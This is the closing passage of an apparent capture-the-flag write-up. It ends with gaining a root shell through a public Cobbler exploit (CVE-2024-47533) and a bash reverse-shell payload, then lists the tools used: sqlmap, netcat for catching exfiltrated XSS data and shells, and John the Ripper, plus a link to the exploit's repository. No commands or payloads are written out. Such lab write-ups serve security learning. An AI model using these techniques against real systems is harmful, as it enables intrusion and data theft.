22. **Ran the public PoC exploit** against the tunneled port with a `bash` reverse-shell payload, catching a shell as **root**.
23. **Captured `root.txt`**, completing the box.

---

## References / Tools Used

- `nmap` — initial service scan
- `sqlmap` — SQL injection detection, exploitation, file read/write
- `curl` — manual HTTP requests for SQLi, XSS payload delivery, SSTI testing
- `nc` (netcat) — catching exfiltrated XSS data and reverse shells
- `john` (John the Ripper) — password hash cracking
- SSH local port forwarding (`ssh -L`) — tunneling to an internal-only service
- **CVE-2024-47533** PoC exploit: `https://github.com/dollarboysushil/CVE-2024-47533-Cobbler-XMLRPC-Authentication-Bypass-RCE-Exploit-POC`
